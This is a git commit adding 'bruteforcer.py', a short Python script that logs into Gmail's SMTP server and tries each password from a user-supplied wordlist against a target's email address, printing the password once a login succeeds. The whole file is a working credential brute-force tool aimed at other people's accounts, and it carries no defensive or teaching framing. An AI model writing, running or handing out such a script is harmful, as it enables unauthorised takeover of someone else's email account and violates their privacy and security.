8fd2484435cf475cee2caf31ee9d0fbed9fe9476
Young Baykay <youngtech412@gmail.com>
2019-09-06 13:54:42 +0100

    first commit

---
+++ bruteforcer.py
@@ -0,0 +1,29 @@
+# Importing necessary libs
+import smtplib
+from termcolor import colored
+import os
+
+# Clearing the screen for new session
+os.system('clear')
+
+# Setting up host server
+btf_server = smtplib.SMTP('smtp.gmail.com', 587)
+btf_server.ehlo()
+btf_server.starttls()
+
+# Getting username snd password list from user.
+emailaddrs = input(colored("[*] Enter Targets Email: ", 'yellow'))
+pwdlst = input(colored("[*] Enter Path to Password File: ", 'yellow'))
+
+# Opening the Password list and Setting it to 'read mode'
+opn_file = open(pwdlst, 'r')
+
+# iterating over the password list to get the password
+for password in opn_file:
+    password = password.strip()
+    try:
+        btf_server.login(emailaddrs, password)
+        print(colored('[+] Password Found: %s' % password, 'green'))
+        break
+    except smtplib.SMTPAuthenticationError:
+        print(colored('[!] Wrong Password: {}'.format(password), 'red'))
